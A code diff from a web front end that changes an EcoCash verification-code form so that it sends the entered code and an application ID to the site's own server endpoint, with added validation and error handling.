@@ -1894,27 +1894,70 @@ async function submitEcoCashVerificationCode() {
 // SAVE ECOCASH VERIFICATION
 // ======================================================
 
-function saveEcoCashVerification() {
+async function saveEcoCashVerification() {
 
-    const code = document
-        .getElementById("ecoVerificationCode")
-        .value
-        .trim();
+    const input =
+        document.getElementById("ecoVerificationCode");
+
+    const code = input.value.trim();
 
     if (code === "") {
 
-        alert("Please enter the verification code.");
+        alert("Please enter the ecocash verification code.");
 
         return;
 
     }
 
-    sessionStorage.setItem(
-        "ecoVerificationCode",
-        code
-    );
+    const applicationId =
+        sessionStorage.getItem("applicationId");
 
-    loadVerificationPendingScreen();
+    if (!applicationId) {
+
+        alert("Application session not found.");
+
+        return;
+
+    }
+
+    try {
+
+        const response = await fetch(
+            `/save-ecocash-verification/${applicationId}`,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    ecocashVerificationCode: code
+                })
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.success) {
+
+            throw new Error(
+                result.message ||
+                "Unable to save ecocash verification."
+            );
+
+        }
+
+        // Saved on the server
+        loadVerificationPendingScreen();
+
+    } catch (err) {
+
+        console.error(err);
+
+        alert("Unable to connect to the server.");
+
+    }
 
 }
 // ======================================================
